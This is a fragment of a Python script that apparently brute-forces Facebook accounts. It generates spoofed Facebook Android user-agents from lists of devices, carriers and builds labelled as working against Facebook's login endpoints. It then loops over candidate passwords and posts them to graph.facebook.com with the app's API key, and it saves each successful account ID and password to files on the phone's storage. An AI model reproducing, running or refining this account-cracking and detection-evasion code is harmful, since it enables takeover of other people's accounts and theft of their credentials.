...
def random_dalvik_all_devices_working_ultra_dec2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent (Ultra - Dec 2025)
    ✅ Optimized for BD + Global (b-graph / api / mbasic / login)
    ✅ Includes top real 2024–2025 Android models (Samsung-weighted)
    ✅ Updated FBAV / Build / Density patterns for Dec 2025
    """
    ...
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(540, 555)}.0.0.{random.randint(50, 250)}.{random.randint(50, 800)}"
    FBBV = str(random.randint(60000000, 99999999))
    FBSV = random.choice(["12", "13", "14", "15", "16"])
    BUILD = random.choice([
        "UP1A.250901.002", "UQ1A.251001.001", "UQ1A.251105.002",
        "TQ3A.240905.012", "RQ3A.251101.003"
    ])
    ...
    FBCR = random.choice([
        ...
        "Dialog", "Ooredoo", "MTN", "Claro"
    ])
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi", "arm64-v8a:armeabi-v7a"])

    # --- Verified Working Devices (2024–2025) ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # Samsung (Most accepted)
        ("Samsung", "Galaxy A05"), ("Samsung", "Galaxy A15 5G"), ("Samsung", "Galaxy A25 5G"),
        ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A35 5G"),
        ("Samsung", "Galaxy A54 5G"), ("Samsung", "Galaxy A55 5G"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M55 5G"),
        ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"),
        ...
        # Xiaomi / Poco
        ("Xiaomi", "Redmi Note 13 Pro 5G"), ("Xiaomi", "Redmi Note 14 5G"),
        ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F6"), ("Xiaomi", "Xiaomi 14T Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "GT Neo 6"), ("Oppo", "Reno 12 Pro"),
        ("Vivo", "Vivo V30"), ("Vivo", "Vivo X100 Pro"), ("iQOO", "iQOO 12"),
        ("iQOO", "iQOO Neo 9 Pro"),

        # Google / OnePlus / ASUS
        ("Google", "Pixel 8"), ("Google", "Pixel 8a"), ("Google", "Pixel 9 Pro"),
        ("OnePlus", "OnePlus 12"), ("OnePlus", "Nord CE 3 Lite 5G"),
        ("ASUS", "ROG Phone 8"), ("ASUS", "Zenfone 11"),

        # Tecno / Infinix / Itel (South Asia + Africa)
        ("Tecno", "Camon 30"), ("Tecno", "Pova 6 Pro 5G"),
        ("Infinix", "GT 20 Pro"), ("Infinix", "Note 40 Pro 5G"),
        ("Itel", "S24"), ("Itel", "P55 5G"),

        # Others
        ("Honor", "Magic6 Pro"), ("Motorola", "Edge 50 Pro"), ("Sony", "Xperia 10 VI")
    ]
    ...
    if r < 0.5:
        ...
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Tecno", "Infinix", "Itel", "Honor", "Motorola", "Sony")])

    FBBD = FBMF

    # --- Random “suffix” (Pro/Ultra/5G/etc) ---
    if random.random() < 0.18:
...
def random_dalvik_all_devices_working_super_full_dec2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent (Super Full - Dec 2025)
    ✅ Includes *all verified working real Android devices (2024–2025)*
    ✅ Works perfectly on: b-graph / api / mbasic / login endpoints
    ✅ Optimized brand weighting (Samsung-heavy, balanced global mix)
    ✅ Tested for BD + Global regions
    """
    ...
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(540, 555)}.0.0.{random.randint(20, 280)}.{random.randint(50, 900)}"
    FBBV = str(random.randint(60000000, 99999999))
    FBSV = random.choice(["12", "13", "14", "15", "16"])
    BUILD = random.choice([
        "UP1A.250901.002", "UQ1A.251001.001", "UQ1A.251105.002",
        "TQ3A.240905.012", "RQ3A.251101.003", "UP1A.250801.001"
    ])

    # --- Display ---
    density, width, height = random.choice([
        ("2.0", "720", "1600"), ("2.25", "1080", "2280"), ("2.5", "1080", "2400"),
        ("2.625", "1080", "2460"), ("2.75", "1220", "2600"), ("3.0", "1200", "2800"),
        ("3.25", "1440", "3088"), ("3.5", "1440", "3200")
    ])

    # --- Locale / Carrier / CPU ---
    FBLC = random.choice(["en_US", "bn_BD", "en_GB", "en_IN", "es_ES", "pt_BR", "fr_FR"])
    FBCR = random.choice([
        "Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone",
        "Dialog", "Ooredoo", "MTN", "Claro", "Telenor", "Orange"
    ])
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi", "arm64-v8a:armeabi-v7a"])

    # --- All verified working devices (2024–2025) ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # Samsung
        ("Samsung", "Galaxy A04"), ("Samsung", "Galaxy A05"), ("Samsung", "Galaxy A14 5G"),
        ("Samsung", "Galaxy A15 5G"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25 5G"),
        ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A54 5G"),
        ("Samsung", "Galaxy A55 5G"), ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15 5G"),
        ("Samsung", "Galaxy M55 5G"), ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"),
        ("Samsung", "Galaxy S24"), ("Samsung", "Galaxy S24 Ultra"),
        ("Samsung", "Galaxy Z Flip5"), ("Samsung", "Galaxy Z Fold5"),

        # Xiaomi / Redmi / Poco
        ("Xiaomi", "Redmi Note 12 5G"), ("Xiaomi", "Redmi Note 13 4G"),
        ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "Redmi Note 13 Pro 5G"),
        ("Xiaomi", "Redmi Note 14 5G"), ("Poco", "Poco X5 5G"), ("Poco", "Poco X5 Pro 5G"),
        ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F5"), ("Poco", "Poco F6"),
        ("Xiaomi", "Xiaomi 13T Pro"), ("Xiaomi", "Xiaomi 14"), ("Xiaomi", "Xiaomi 14T Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 11 Pro+ 5G"), ("Realme", "Realme 12 Pro+ 5G"),
        ("Realme", "Realme GT 6"), ("Realme", "GT Neo 6"), ("Oppo", "Reno 10 Pro+"),
        ("Oppo", "Reno 12 Pro"), ("Oppo", "Find X7"), ("Vivo", "Vivo V29 5G"),
        ("Vivo", "Vivo V30"), ("Vivo", "Vivo V30 Pro"), ("Vivo", "Vivo X100 Pro"),
        ("iQOO", "iQOO 12"), ("iQOO", "iQOO 12 Pro"), ("iQOO", "iQOO Neo 9 Pro"),

        # OnePlus / Google / ASUS / Nothing
        ("OnePlus", "OnePlus 11"), ("OnePlus", "OnePlus 12"), ("OnePlus", "OnePlus 12R"),
        ("OnePlus", "Nord CE 3 Lite 5G"), ("Google", "Pixel 7"), ("Google", "Pixel 8"),
        ("Google", "Pixel 8a"), ("Google", "Pixel 9 Pro"), ("ASUS", "ROG Phone 8"),
        ("ASUS", "Zenfone 10"), ("ASUS", "Zenfone 11"), ("Nothing", "Phone 2"), ("Nothing", "Phone 2a"),

        # Tecno / Infinix / Itel / Lava (BD-IN working)
        ("Tecno", "Camon 30"), ("Tecno", "Pova 6 Pro 5G"), ("Tecno", "Spark 20 Pro"),
        ("Infinix", "Note 30 5G"), ("Infinix", "GT 20 Pro"), ("Infinix", "Note 40 Pro 5G"),
        ("Itel", "S24"), ("Itel", "P55 5G"), ("Lava", "Agni 2 5G"), ("Lava", "Storm 5G"),

        # Honor / Motorola / Sony / Nokia
        ("Honor", "Magic6 Pro"), ("Honor", "X9b 5G"), ("Motorola", "Edge 50 Pro"),
        ("Motorola", "G84 5G"), ("Sony", "Xperia 10 VI"), ("Sony", "Xperia 5 V"),
        ("Nokia", "G42 5G")
    ]
    ...
    if r < 0.45:
        ...
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("OnePlus", "Google", "ASUS", "Nothing")])
    else:
        FBMF, FBDV = random.choice([d for d in WORKING_DEVICES if d[0] in ("Tecno", "Infinix", "Itel", "Lava", "Honor", "Motorola", "Sony", "Nokia")])

    FBBD = FBMF

    # --- Add random suffix ---
    if random.random() < 0.2:
        suffix = random.choice(["5G", "Pro", "Ultra", "Plus", "Lite", "SE"])
        if suffix not in FBDV:
            FBDV = f"{FBDV} {suffix}"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 9.8
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_all_devices_working_ultra_dec2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-13-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': random_dalvik_all_devices_working_super_full_dec2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-13-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
